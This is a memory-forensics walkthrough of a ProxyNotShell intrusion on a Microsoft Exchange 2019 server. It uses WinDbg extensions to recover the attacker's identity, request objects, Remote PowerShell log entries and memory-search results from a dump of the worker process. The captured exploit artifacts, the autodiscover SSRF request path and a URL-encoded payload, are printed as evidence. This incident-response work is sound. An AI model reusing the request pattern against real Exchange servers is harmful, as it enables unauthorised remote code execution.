# Description

ProxyNotShell, similar to ProxyShell, is a set of vulnerabilities in Microsoft Exchange Servers that involves two critical vulnerabilities. When exploited they enable an **authenticated** attacker to perform remote code execution. The specific CVEs associated with ProxyNotShell are:

- **CVE-2022-41040:** This is a Server-Side Request Forgery (SSRF) vulnerability. In this vulnerability, an authenticated attacker can send crafted HTTP requests that the server misinterprets, leading to unauthorized actions.
- **CVE-2022-41082:** This vulnerability allows for remote code execution, particularly when PowerShell is accessible to the attacker. After exploiting CVE-2022-41040, the attacker can leverage this vulnerability to execute arbitrary PowerShell commands on the Exchange server.

The SSRF vulnerability **(CVE-2022-41040)** in ProxyNotShell requires the attacker to be authenticated. This means that the attacker needs a valid username and password for an account. Without these credentials, exploiting this vulnerability is not possible.

The impact of the ProxyNotShell allows a threat actor to run commands on an Exchange server with elevated privileges as the **NT AUTHORITY\SYSTEM** account.

The following two extensions are being used during this analysis:

- **MEX**
- **SOSEX**

Link to these memory dumps: https://mega.nz/file/zssHXbRQ#kO_OwSaKIB4kt_umYPAkq2dQnTPENyis4bz1pdcY0Rs

# WinDbg Walk Through - Analysis

Load the Memory Dump in WinDbg:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/6404069a-1623-4edc-a4ad-3a9851ee1b14)

Let's start with the **`!mex.di`** command which stands for dump information. This command retrieves information about the machine from which the memory dump originated. It's especially handy when working with multiple memory dumps, as it helps distinguish the analysis related to each specific dump. This is an improved version of the **`vertarget`** command.

```
0:000> !mex.di
Computer Name: EXCHANGE2019
User Name: EXCHANGE2019$
PID: 0x2A3C = 0n10812
Windows 10 Version 17763 MP (4 procs) Free x64
Product: Server, suite: TerminalServer SingleUserTS
Edition build lab: 17763.1.amd64fre.rs5_release.180914-1434
Debug session time: Fri May 19 01:12:25.000 2023 (UTC - 8:00)
System Uptime: 0 days 1:43:01.209
Process Uptime: 0 days 1:38:58.000
  Kernel time: 0 days 0:00:07.000
  User time: 0 days 0:00:25.000
```

Let's ensure that the memory dump is correct, since as discussed at the previous write-up. There are 14 IIS Worker Process managing a different Application Pool. The command **`!peb`** in WinDbg, with the **`!extensions/mex.dll.grep`** filtering for CommandLine, outputs the command line used to start the current process. In this case, it shows that an IIS worker process (w3wp.exe) was started for the application pool **MSExchangePowerShellAppPool**, which is indeed the correct one.

For analyzing ProxyNotShell, the application pool to dump is **MSExchangePowerShellAppPool**. This is because the vulnerabilities in ProxyNotShell, especially the remote code execution part, are exploited through the PowerShell backend, which is managed by the **MSExchangePowerShellAppPool**.

```
0:000> !extensions/mex.dll.grep CommandLine !peb
    CommandLine:  'c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangePowerShellAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm11c96e95-169d-452d-ac21-58614589c86e -h "C:\inetpub\temp\apppools\MSExchangePowerShellAppPool\MSExchangePowerShellAppPool.config" -w "" -m 0'
```

We will start with running the **`!Mex.AspxPagesExt`** command which generates a report listing all current ASP.NET requests, including details such as address, completion status, timeouts, the time elapsed, thread IDs, return codes, HTTP verbs, and URLs for each request. There is an interesting request, which we can examine further.

```
0:000> !Mex.AspxPagesExt
 Address          Completed Timeout Time (secs) ThreadId ReturnCode Verb Url
 000002688b4765b0       yes     110                             200 POST /PowerShell/?
á_/Ñ%
 ÍÈ?ÀÑËÄ?ÎÁÊ/ÍÈ?ÀÑËÄ?ÎÁÊ¦Ë?>_ÑÄÇÁ/%>ÑÁ>?Ï ËÈÁÇÊ,ÁÊÈ:_/>>ÁÌ/_ø%Á
1 contexts found (1 displayed).
   AS == possibly async request
   SL == session locked
```

When we examine the memory address, we are able to see other fields. The output displays a **`System.Web.HttpContext`** object in memory, showing fields including references to the associated HTTP request and response objects.

```
0:000> !DisplayObj 0x000002688b4765b0
0x000002688b4765b0 System.Web.HttpContext
[statics]
  0000  _asyncAppHandler                                          : NULL
  0008  _appInstance                                              : NULL
  0010  _handler                                                  : NULL
  0018  _request                                                  : 000002688b476770 (System.Web.HttpRequest)
  0020  _response                                                 : 000002688b4768f8 (System.Web.HttpResponse)
  0028  _server                                                   : NULL
  0030  _traceContextStack                                        : NULL
  0038  _topTraceContext                                          : NULL
  0040  _items                                                    : NULL
  0048  _errors                                                   : NULL
  0050  _tempError                                                : NULL
  0058  _principalContainer                                       : 000002688b476bb0 (System.Web.RootedObjects)
  0060  _Profile                                                  : NULL
  0068  _wr                                                       : 000002688b476088 (System.Web.Hosting.IIS7WorkerRequest)
  0070  _configurationPath                                        : NULL
  0078  _dynamicCulture                                           : 0000026880054e98 (System.Globalization.CultureInfo)
  0080  _dynamicUICulture                                         : 00000268800553c8 (System.Globalization.CultureInfo)
  0088  _handlerStack                                             : NULL
  0090  _pageInstrumentationService                               : NULL
  0098  _webSocketRequestedProtocols                              : NULL
  00a0  _timeoutCancellationTokenHelper                           : 0000026880b23ce0 (System.Web.Util.CancellationTokenHelper)
  00a8  _timeoutLink                                              : NULL
  00b0  _thread                                                   : NULL
  00b8  _configurationPathData                                    : NULL
  00c0  _filePathData                                             : 00000268800921c0 (System.Web.CachedPathData)
  00c8  _sqlDependencyCookie                                      : NULL
  00d0  _sessionStateModule                                       : NULL
  00d8  _templateControl                                          : NULL
  00e0  _notificationContext                                      : NULL
  00e8  IndicateCompletionContext                                 : NULL
  00f0  ThreadInsideIndicateCompletion                            : NULL
  00f8  ThreadContextId                                           : 000002688b476758 (System.Object)
  0100  _syncContext                                              : NULL
  0108  _threadWhichStartedWebSocketTransition                    : NULL
  0110  _webSocketNegotiatedProtocol                              : NULL
  0118  _remapHandler                                             : NULL
  0120  _currentHandler                                           : NULL
  0128  <System.Web.IPrincipalContainer.Principal>k__BackingField : NULL
  0130  _rootedObjects                                            : 000002688b476bb0 (System.Web.RootedObjects)
  0138  _CookielessHelper                                         : 000002688b476a50 (System.Web.Security.CookielessHelperClass)
  0140  _timeoutStartTimeUtcTicks                                 : 638200838825034701 (System.Int64)
  0148  _timeoutTicks                                             : 1100000000 (System.Int64)
  0150  _rootedPtr                                                : 0000000000000000 (System.IntPtr)
  0158  _asyncPreloadModeFlags                                    : None (0) (System.Web.Configuration.AsyncPreloadModeFlags)
  015c  _serverExecuteDepth                                       : 0 (System.Int32)
  0160  _timeoutState                                             : 0 (System.Int32)
  0164  <SessionStateBehavior>k__BackingField                     : Default (0) (System.Web.SessionState.SessionStateBehavior)
  0168  _asyncPreloadModeFlagsSet                                 : False (System.Boolean)
  0169  _errorCleared                                             : False (System.Boolean)
  016a  _skipAuthorization                                        : False (System.Boolean)
  016b  _preventPostback                                          : False (System.Boolean)
  016c  _runtimeErrorReported                                     : False (System.Boolean)
  016d  _threadAbortOnTimeout                                     : True (System.Boolean)
  016e  _delayedSessionState                                      : False (System.Boolean)
  016f  _isAppInitialized                                         : True (System.Boolean)
  0170  _isIntegratedPipeline                                     : True (System.Boolean)
  0171  _finishPipelineRequestCalled                              : True (System.Boolean)
  0172  _impersonationEnabled                                     : False (System.Boolean)
  0173  HideRequestResponse                                       : False (System.Boolean)
  0174  InIndicateCompletion                                      : False (System.Boolean)
  0175  _webSocketTransitionState                                 : Inactive (0) (System.Web.WebSocketTransitionState)
  0176  <FirstRequest>k__BackingField                             : False (System.Boolean)
  0177  _requiresSessionStateFromHandler                          : False (System.Boolean)
  0178  _readOnlySessionStateFromHandler                          : False (System.Boolean)
  0179  InAspCompatMode                                           : False (System.Boolean)
  017a  <DisableCustomHttpEncoder>k__BackingField                 : False (System.Boolean)
  017b  _ProfileDelayLoad                                         : False (System.Boolean)
  0180  _utcTimestamp                                             : 000002688b476738 5/19/2023 9:04:42 AM (System.DateTime)
  0188  _requestCompletedQueue                                    : 000002688b476740 (System.Web.Util.SubscriptionQueue<System.Action<System.Web.HttpContext>>)
  0190  _pipelineCompletedQueue                                   : 000002688b476748 (System.Web.Util.SubscriptionQueue<System.IDisposable>)
```


Let's look at the **`System.Web.RootedObjects`** object, which is part of the web request handling an ASP.NET application. The fields displayed include null reference to the **`HttpContext`**, a **`GenericPrincipal`** object indicating user identity and roles, and other internal details like activity ID for request tracking and a subscription queue for pipeline completion events.

```
0:000> !mex.DisplayObj 0x000002688b476bb0
0x000002688b476bb0 System.Web.RootedObjects
  0000  <HttpContext>k__BackingField       : NULL
  0008  <Principal>k__BackingField         : 000002688b4a7c20 (System.Security.Principal.GenericPrincipal)
  0010  <WebSocketPipeline>k__BackingField : NULL
  0018  <WorkerRequest>k__BackingField     : NULL
  0020  <Pointer>k__BackingField           : 0000000000000000 (System.IntPtr)
  0028  _requestActivityIdRefCount         : 1 (System.Int32)
  002c  _activityIdTracingIsEnabled        : False (System.Boolean)
  0030  _requestActivityId                 : 000002688b476be8 00000000-0000-0000-0000-000000000000 (System.Guid)
  0040  _pipelineCompletedQueue            : 000002688b476bf8 (System.Web.Util.SubscriptionQueue<System.IDisposable>)
  0048  _handle                            : 000002688b476c00 (System.Runtime.InteropServices.GCHandle)
```

This output displays a **`System.Security.Principal.GenericIdentity`** object, which represents the identity of a user. ProxyNotShell requires a valid credential, so in this case. This identity happens to be used during the ProxyNotShell attack.

```
0:000> !mex.DisplayObj 0x000002688b4a7018
0x000002688b4a7018 System.Security.Principal.GenericIdentity
  0000  m_userSerializationData : NULL
  0008  m_instanceClaims        : 000002688b4a7b08 (System.Collections.Generic.List<System.Security.Claims.Claim>) [Length: 1]
  0010  m_externalClaims        : 000002688b4a7b30 (System.Collections.ObjectModel.Collection<System.Collections.Generic.IEnumerable<System.Security.Claims.Claim>>)
  0018  m_nameType              : 00000268800093d8  "http://schemas.xmlsoap.org/ws/2005/05/id..." [58] (System.String)
  0020  m_roleType              : 0000026880009600  "http://schemas.microsoft.com/ws/2008/06/..." [60] (System.String)
  0028  m_version               : 0000026880009540  "1.0" [3] (System.String)
  0030  m_actor                 : NULL
  0038  m_authenticationType    : NULL
  0040  m_bootstrapContext      : NULL
  0048  m_label                 : NULL
  0050  m_serializedNameType    : NULL
  0058  m_serializedRoleType    : NULL
  0060  m_serializedClaims      : NULL
  0068  m_name                  : 000002688b4a6ea8  "dhaka\testexploit" [17] (System.String)
  0070  m_type                  : 000002688b4a70a0  "Cafe-WindowsIdentity;[{"Key":"Item-Ident..." [1319] (System.String)
```

The **`m_type`** field in the **`System.Security.Principal.GenericIdentity`** object contains a string that represents a serialized form of some identity details. It's hard to tell what exactly it contains, but it looks like the following:

```
0:000> !mex.DisplayObj -raw 0x000002688b4a70a0
0x000002688b4a70a0 System.String
Cafe-WindowsIdentity;[{"Key":"Item-Identity","Value":"<%3f%250A%25C2%2591%2504%25C3%25A1_%2f%25C3%2591%2525%250A%25C2%2591%25C2%2595%25C2%25A0%25C3%258D%25C3%2588%3f%25C3%2580%25C3%2591%25C3%258B%25C3%2584%3f%25C3%258E%25C3%2581%25C3%258A%2507%2f%25C3%258D%25C3%2588%3f%25C3%2580%25C3%2591%25C3%258B%25C3%2584%3f%25C3%258E%25C3%2581%25C3%258A%2506%25C2%25A6%25C3%258B%3f%253E%251A_%25C3%2591%25C3%2584%25C3%2587%25C3%2581%2f%2525%2506%253E%25C3%2591%25C3%2581%253E%3f%25C3%258F%2520%25C3%258B%25C3%2588%25C3%2581%25C3%2587%25C3%258A%2505%2c%25C3%2581%25C3%258A%25C3%2588%3a_%2f%253E%253E%2506%25C3%2581%25C3%258C%2f_%25C3%25B8%2525%25C3%2581><dhaka\\testexploit><Cafe-WindowsIdentity>"},{"Key":"Item-SessionId","Value":null},{"Key":"Item-RequestId","Value":"48f0e360-837c-4041-b4ac-93045e61f9b7"},{"Key":"X-EX-UserToken","Value":"VgAAQQhLZXJiZXJvc0QBMEwBME4RREhBS0FcdGVzdGV4cGxvaXRVL1MtMS01LTIxLTIyNlwwNjI4NzNcMC0xNDgzNTczMTMyLTU5MTI1MjU4Ni0xMTQ5UAEwTwhBUUFBQUFBQU0BMFcAH4sIAAAAAAAEAE1OwarCMBD8paTao4fERhrorrRu+vT4rNL3Ym8GmuTr3RYKLuwyMzsM049G9epx\/f0pX\/fdI7ez1tqUjowE4zrbuqCvdTcNu2561vp9LybRXyQ1ZAJeRIJl\/W1Gb\/eYYWZdnCuQjCNkG5BeEbxLSGPBv4jVVOtR8QzLebskYkMugDe8toDqls7VkOEo2DtmJMYEiT0lkJWctcd\/IVmrlwAtIXAHzlDfXDZkV348bdxEPS\/K39Y9Yrt2aLYO6NsApE9qncPhA\/+j\/OocAQAA"},{"Key":"Item-ClientIP","Value":"10.0.0.14:41399"}]
[statics]
  0000  m_stringLength : 1319 (System.Int32)
  0004  m_firstChar    : C (System.Char)
```

This output shows the details of a **`System.Web.Hosting.IIS7WorkerRequest`** object, which provides information on the status and properties of an IIS worker request, such as the start time, request headers, HTTP method, content types, and various other states. Here we also can see the malicious POST request that was initiated by the ProxyNotShell attack:

```
0:000> !ForEachObject -s -x "!do2 @#Obj" System.Web.Hosting.IIS7WorkerRequest
0x000002688b476088 System.Web.Hosting.IIS7WorkerRequest
[statics]
  0000  _isInReadEntitySync          : False (System.Boolean)
  0008  _startTime                   : 000002688b476098 5/19/2023 9:04:42 AM (System.DateTime)
  0010  _traceId                     : 000002688b4760a0 00000000-0000-0000-0000-000000000000 (System.Guid)
  0020  _headerEncoding              : 0000026880061410 (System.Text.UTF8Encoding)
  0028  _asyncResultBase             : NULL
  0030  _appPath                     : 000002688b4764c8  "/PowerShell" [11] (System.String)
  0038  _appPathTranslated           : 000002688b4764f8  "C:\Program Files\Microsoft\Exchange Serv..." [77] (System.String)
  0040  _path                        : 000002688b4763d0  "/PowerShell/" [12] (System.String)
  0048  _queryString                 : 000002688b476408  "%17Email%15Autodiscover/autodiscover.jso..." [80] (System.String)
  0050  _filePath                    : 000002688b4763d0  "/PowerShell/" [12] (System.String)
  0058  _pathInfo                    : 0000026880001420  "" [0] (System.String)
  0060  _pathTranslated              : 000002688b4762f0  "C:\Program Files\Microsoft\Exchange Serv..." [77] (System.String)
  0068  _httpVerb                    : 000002688b4763a8  "POST" [4] (System.String)
  0070  _unknownRequestHeaders       : 000002688b4a08f8 (System.String[][]) [Length: 15]
  0078  _knownRequestHeaders         : 000002688b49e760 (System.String[]) [Length: 40]
  0080  _cachedResponseBodyBytes     : NULL
  0088  _preloadedContent            : NULL
  0090  _cacheUrl                    : 000002688b4761d0  "https://exchange2019.dhaka.bd.net:444/Po..." [130] (System.String)
  0098  _clientCert                  : NULL
  00a0  _clientCertPublicKey         : NULL
  00a8  _clientCertBinaryIssuer      : NULL
  00b0  _channelBindingToken         : NULL
  00b8  _disposeLockObj              : 000002688b4761b8 (System.Object)
  00c0  _clientDisconnectTokenHelper : NULL
  00c8  _allocator                   : 000002688932a7d8 (System.Web.AllocatorProvider)
  00d0  _context                     : 0000000000000000 (System.IntPtr)
  00d8  _pCookedUrl                  : 0000000000000000 (System.IntPtr)
  00e0  _contentType                 : 3 (System.Int32)
  00e4  _contentTotalLength          : 1765 (System.Int32)
  00e8  _cachedResponseBodyLength    : 0 (System.Int32)
  00ec  _preloadedLength             : 0 (System.Int32)
  00f0  _clientCertEncoding          : 0 (System.Int32)
  00f4  _rewriteNotifyDisabled       : False (System.Boolean)
  00f5  _rebaseClientPath            : False (System.Boolean)
  00f6  _requestHeadersAvailable     : True (System.Boolean)
  00f7  _preloadedLengthRead         : True (System.Boolean)
  00f8  _preloadedContentRead        : True (System.Boolean)
  00f9  _traceEnabled                : False (System.Boolean)
  00fa  _connectionClosed            : False (System.Boolean)
  00fb  _disconnected                : False (System.Boolean)
  00fc  _headersSent                 : False (System.Boolean)
  00fd  _trySkipIisCustomErrors      : False (System.Boolean)
  00fe  _clientCertFetched           : False (System.Boolean)
  0100  _traceId                     : 000002688b476190 00000000-0000-0000-0000-000000000000 (System.Guid)
  0110  _clientCertValidFrom         : 000002688b4761a0 1/1/0001 12:00:00 AM (System.DateTime)
  0118  _clientCertValidUntil        : 000002688b4761a8 1/1/0001 12:00:00 AM (System.DateTime)
--------------------------------------------------------------------------------
1 objects found.
```

The **`_cacheUrl`** field in the **`System.Web.Hosting.IIS7WorkerRequest`** object represents the cached URL of the request being processed by the IIS worker process. 

We can see an interesting POST request to **`https://exchange2019.dhaka.bd.net:444/PowerShell/?%17Email%15Autodiscover/autodiscover.json?micheal.nienow@stehr-kertzmann.example`**

```
0:000> !mex.DisplayObj -raw 0x000002688b4761d0
0x000002688b4761d0 System.String
https://exchange2019.dhaka.bd.net:444/PowerShell/?%17Email%15Autodiscover/autodiscover.json?micheal.nienow@stehr-kertzmann.example
[statics]
  0000  m_stringLength : 130 (System.Int32)
  0004  m_firstChar    : h (System.Char)
```

This POST request closely matches the description provided by CrowdStrike in their article detailing the characteristics of a ProxyNotShell request. For further reference, the article is accessible at: https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/bbbfbbc9-1ab6-4a3e-ac7f-e6455acb6133)

The **`_knownRequestHeaders`** field shows specific HTTP request headers, which contains the FQDN of the Exchange server, as well as a User-Agent were the request originated from.

```
0:000> !mex.DisplayObj 0x000002688b49e760
[raw] 000002688b49e760 System.String[] Length: 40
[11] 000002688b49e8b8  "1765" [4] (System.String)
[12] 000002688b49e8e0  "application/soap+xml;charset=UTF-8" [34] (System.String)
[24] 000002688b49e940  "Negotiate YIIG5gYJKoZIhvcSAQICAQBuggbVMI..." [2370] (System.String)
[28] 000002688b49fbe0  "exchange2019.dhaka.bd.net:444" [29] (System.String)
[39] 000002688b49fc38  "UP Mozilla/5.0 (Windows NT 10.0; Win64; ..." [132] (System.String)
```

We can use the **SOSEX** extension that has been created by **Steve Johnson**. The **SOSEX** extension is designed to enhance the analysis and troubleshooting of .NET applications. We can use the **`!sosex.strings`** to search for strings in a .NET application's managed heap.

```
0:000> !sosex.strings /m:"C:\Program Files\Microsoft\Exchange Server\V15\Logging\*"
This dump has no SOSEX heap index.
The heap index makes searching for references and roots much faster.
To create a heap index, run !bhi
Address            Gen  Value
---------------------------------------
00000268807b5080            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver
000002688087e8a8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Calendar Repair Assistant
000002688087f230            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Managed Folder Assistant
0000026880882ca8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\IRMLogs
0000026880aaf738            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra
0000026880aaf7d8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http
0000026880aaf8c0            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\RequestMonitor
0000026880ad8848            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpRequestFiltering\
0000026880add718            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\RoutingUpdateModule\Powershell
0000026880e10ba8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra
0000026880e10c48            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\AuthZ
000002688145db28            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver
0000026882df3630            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet
0000026888d53be0            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\Rps_Http_2023051909-1.LOG
0000026888d63e70            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver\w3wp.exe_RemotePS_2023051909-1.LOG
0000026888d76c30            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver\w3wp.exe_RemotePS_2023051909-2.LOG
0000026888d96698            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\AuthZ\Rps_AuthZ_2023051909-1.LOG
0000026889007968            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet\Rps_Cmdlet_2023051909-1.LOG
0000026889019958            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\RoutingUpdateModule\Powershell\RoutingUpdateModule_2023051909-1.LOG
---------------------------------------
19 matching strings
```

The log file **`Rps_Http_2023051909-1.LOG`** records HTTP requests processed by the Remote PowerShell service, providing detailed information about PowerShell command execution over HTTP for a specific date and time. The content of the file always start with something similar like the following:

```
DateTime,StartTime,RequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ClientRequestId,UrlHost,UrlStem,AuthenticationType,IsAuthenticated,AuthenticatedUser,Organization,ManagedOrganization,ClientIpAddress,ServerHostName,FrontEndServer,HttpStatus,SubStatus,ErrorCode,Action,CommandId,CommandName,SessionId,ShellId,FailFast,ContributeToFailFast,RequestBytes,ClientInfo,CPU,Memory,ActivityContextLifeTime,TotalTime,UrlQuery,GenericLatency,GenericInfo,GenericErrors
#Software: Microsoft Exchange Server
#Version: 15.02.1118.007
#Log-type: Rps Http Logs
#Date: 2023-11-20T14:15:43.189Z
#Fields: DateTime,StartTime,RequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ClientRequestId,UrlHost,UrlStem,AuthenticationType,IsAuthenticated,AuthenticatedUser,Organization,ManagedOrganization,ClientIpAddress,ServerHostName,FrontEndServer,HttpStatus,SubStatus,ErrorCode,Action,CommandId,CommandName,SessionId,ShellId,FailFast,ContributeToFailFast,RequestBytes,ClientInfo,CPU,Memory,ActivityContextLifeTime,TotalTime,UrlQuery,GenericLatency,GenericInfo,GenericErrors
```

We can run the following command to look for access to the PowerShell backend.

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "/PowerShell/,Kerberos,true" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "/PowerShell/,Kerberos,true" at ${address}; dc ${address} L100 } };
Found "/PowerShell/,Kerberos,true" at 00000268`88d55dd9
00000268`88d55dd9  776f502f 68537265 2f6c6c65 72654b2c  /PowerShell/,Ker
00000268`88d55de9  6f726562 72742c73 742c6575 65747365  beros,true,teste
00000268`88d55df9  6f6c7078 2c2c7469 2e30312c 2e302e30  xploit,,,10.0.0.
00000268`88d55e09  452c3431 41484358 3245474e 2c393130  14,EXCHANGE2019,
00000268`88d55e19  48435845 45474e41 39313032 4148442e  EXCHANGE2019.DHA
00000268`88d55e29  422e414b 454e2e44 30322c54 2c302c30  KA.BD.NET,200,0,
00000268`88d55e39  2c2c2c2c 2c2c2c2c 32393531 2050552c  ,,,,,,,,1592,UP 
00000268`88d55e49  697a6f4d 2f616c6c 20302e35 6e695728  Mozilla/5.0 (Win
00000268`88d55e59  73776f64 20544e20 302e3031 6957203b  dows NT 10.0; Wi
00000268`88d55e69  3b34366e 34367820 70412029 57656c70  n64; x64) AppleW
00000268`88d55e79  694b6265 33352f74 36332e37 484b2820  ebKit/537.36 (KH
00000268`88d55e89  204c4d54 6b696c20 65472065 296f6b63  TML  like Gecko)
00000268`88d55e99  72684320 2f656d6f 2e383031 2e302e30   Chrome/108.0.0.
00000268`88d55ea9  61532030 69726166 3733352f 2036332e  0 Safari/537.36 
00000268`88d55eb9  2f676445 2e383031 34312e30 342e3236  Edg/108.0.1462.4
00000268`88d55ec9  2c2c2c36 2c352c35 4130253f 25324325  6,,,5,5,?%0A%C2%
00000268`88d55ed9  30253139 33432534 5f314125 3343252f  91%04%C3%A1_/%C3
00000268`88d55ee9  25313925 30253532 32432541 25313925  %91%25%0A%C2%91%
00000268`88d55ef9  39253243 32432535 25304125 38253343  C2%95%C2%A0%C3%8
00000268`88d55f09  33432544 3f383825 25334325 43253038  D%C3%88?%C3%80%C
00000268`88d55f19  31392533 25334325 43254238 34382533  3%91%C3%8B%C3%84
00000268`88d55f29  3343253f 25453825 38253343 33432531  ?%C3%8E%C3%81%C3
00000268`88d55f39  25413825 252f3730 38253343 33432544  %8A%07/%C3%8D%C3
00000268`88d55f49  3f383825 25334325 43253038 31392533  %88?%C3%80%C3%91
00000268`88d55f59  25334325 43254238 34382533 3343253f  %C3%8B%C3%84?%C3
00000268`88d55f69  25453825 38253343 33432531 25413825  %8E%C3%81%C3%8A%
00000268`88d55f79  43253630 36412532 25334325 253f4238  06%C2%A6%C3%8B?%
00000268`88d55f89  31254533 43255f41 31392533 25334325  3E%1A_%C3%91%C3%
00000268`88d55f99  43253438 37382533 25334325 252f3138  84%C3%87%C3%81/%
00000268`88d55fa9  30253532 45332536 25334325 43253139  25%06%3E%C3%91%C
00000268`88d55fb9  31382533 3f453325 25334325 32254638  3%81%3E?%C3%8F%2
00000268`88d55fc9  33432530 25423825 38253343 33432538  0%C3%8B%C3%88%C3
00000268`88d55fd9  25313825 38253343 33432537 25413825  %81%C3%87%C3%8A%
00000268`88d55fe9  25203530 38253343 33432531 25413825  05 %C3%81%C3%8A%
00000268`88d55ff9  38253343 2f5f3a38 25453325 30254533  C3%88:_/%3E%3E%0
00000268`88d56009  33432536 25313825 38253343 255f2f43  6%C3%81%C3%8C/_%
00000268`88d56019  42253343 35322538 25334325 522c3138  C3%B8%25%C3%81,R
00000268`88d56029  65757165 6f4d7473 6f74696e 65522e72  equestMonitor.Re
00000268`88d56039  74736967 303d7265 6e69573b 61444d52  gister=0;WinRMDa
00000268`88d56049  65536174 7265646e 6e65532e 3b303d64  taSender.Send=0;
00000268`88d56059  48737052 44707474 62617461 56657361  RpsHttpDatabaseV
00000268`88d56069  64696c61 6f697461 646f4d6e 3d656c75  alidationModule=
00000268`88d56079  68543b30 74746f72 676e696c 70747448  0;ThrottlingHttp
00000268`88d56089  75646f4d 303d656c 69572c3b 444d526e  Module=0;,WinRMD
00000268`88d56099  53617461 65646e65 75412e72 6e656874  ataSender.Authen
00000268`88d560a9  61636974 6e6f6974 65707954 6e65533d  ticationType=Sen
00000268`88d560b9  69573b74 444d526e 53617461 65646e65  t;WinRMDataSende
00000268`88d560c9  614e2e72 5064656d 3d657069 746e6553  r.NamedPipe=Sent
00000268`88d560d9  456e4f3b 6552646e 73657571 6e452e74  ;OnEndRequest.En
00000268`88d560e9  6f432e64 6e65746e 70795474 70613d65  d.ContentType=ap
00000268`88d560f9  63696c70 6f697461 6f732f6e 782b7061  plication/soap+x
00000268`88d56109  63206c6d 73726168 55207465 382d4654  ml charset UTF-8
00000268`88d56119  533a533b 69767265 6f436563 6e6f6d6d  ;S:ServiceCommon
00000268`88d56129  6174654d 61746164 7474482e 74654d70  Metadata.HttpMet
00000268`88d56139  3d646f68 54534f50 6c62443b 4d4c573a  hod=POST;Dbl:WLM
00000268`88d56149  3d53542e 33493b35 44413a32 5b432e53  .TS=5;I32:ADS.C[
00000268`88d56159  76726553 30327265 3d5d3931 3a463b33  Server2019]=3;F:
00000268`88d56169  2e534441 535b4c41 65767265 31303272  ADS.AL[Server201
00000268`88d56179  313d5d39 3935302e 33493b31 54413a32  9]=1.0591;I32:AT
00000268`88d56189  5b432e45 76726553 30327265 642e3931  E.C[Server2019.d
00000268`88d56199  616b6168 2e64622e 5d74656e 463b303d  haka.bd.net]=0;F
00000268`88d561a9  4554413a 5b4c412e 76726553 30327265  :ATE.AL[Server20
00000268`88d561b9  642e3931 616b6168 2e64622e 5d74656e  19.dhaka.bd.net]
00000268`88d561c9  0d2c303d 3230320a 35302d33 5439312d  =0,..2023-05-19T

<<< SNIPPET >>>
```

The above output aligns well with the following that CrowdStrike has described:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/02592ea9-d555-4367-8cda-ffe4b0a0446c)


This log entry is an URL-encoded string in a PowerShell-related HTTP request, which we saw previously as well. It looks to be part of ProxyNotShell.

```
?%0A%C2%91%04%C3%A1_/%C3%91%25%0A%C2%91%C2%95%C2%A0%C3%8D%C3%88?%C3%80%C3%91%C3%8B%C3%84?%C3%8E%C3%81%C3%8A%07/%C3%8D%C3%88?%C3%80%C3%91%C3%8B%C3%84?%C3%8E%C3%81%C3%8A%06%C2%A6%C3%8B?%3E%1A/%25%C3%80%C3%81%3E%20%C2%A6/%C3%84?%C3%82%C3%8B%05:%C3%8D%25/%C3%8D%C3%83%06%C3%88%C3%81%C3%8B%C3%88
```

This command searches through memory for a specific ProxyNotShell related string **`("/PowerShell/?%17Email%15Autodiscover/autodiscover.json?")`**, and for each occurrence found, it checks if it matches a certain pattern and then outputs the content starting from that address. Although we are already aware of this, it's still beneficial to have multiple methods for identifying artifacts.

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "/PowerShell/?%17Email%15Autodiscover/autodiscover.json?" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "//PowerShell/?%17Email%15Autodiscover/autodiscover.json?" at ${address}; dc ${address} L100 } };
Found "//PowerShell/?%17Email%15Autodiscover/autodiscover.json?" at 00000268`99d3bdd2
00000268`99d3bdd2  776f502f 68537265 2f6c6c65 3731253f  /PowerShell/?%17
00000268`99d3bde2  69616d45 3531256c 6f747541 63736964  Email%15Autodisc
00000268`99d3bdf2  7265766f 7475612f 7369646f 65766f63  over/autodiscove
00000268`99d3be02  736a2e72 6d3f6e6f 65686369 6e2e6c61  r.json?micheal.n
00000268`99d3be12  6f6e6569 74734077 2d726865 7472656b  ienow@stehr-kert
00000268`99d3be22  6e616d7a 78652e6e 6c706d61 742f3c65  zmann.example</t
00000268`99d3be32  2f3c3e64 203e7274 2020200a 72743c20  d></tr> .    <tr
00000268`99d3be42  68743c3e 7968503e 61636973 6150206c  ><th>Physical Pa
00000268`99d3be52  2f3c6874 3c3e6874 263e6474 7073626e  th</th><td>&nbsp
